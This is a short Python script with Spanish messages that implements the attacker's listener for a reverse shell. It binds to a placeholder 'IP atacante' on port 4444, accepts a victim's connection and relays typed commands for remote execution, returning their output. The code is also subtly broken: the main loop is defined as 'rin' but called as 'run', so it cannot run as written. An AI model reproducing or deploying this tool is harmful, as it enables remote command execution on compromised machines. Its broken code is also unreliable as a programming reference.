import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

        listener.bind((ip,port))
        listener.listen(0)

        print("[+]Espernado por conexiones")

        self.connection, address = listener.accept()
        print("[+]Tenemos una conexion de "+ str(address))
        
    def reliable_send (self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
        
    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_remoto(self, command):
        self.reliable_send(command)
        return self.reliable_recieve()
    def rin(self):
        while True:
            command = input("Shell>>")
            result = self.ejecutar_remoto(command)
            print(result)
escuchar = Listener("IP atacante", 4444)
escuchar.run()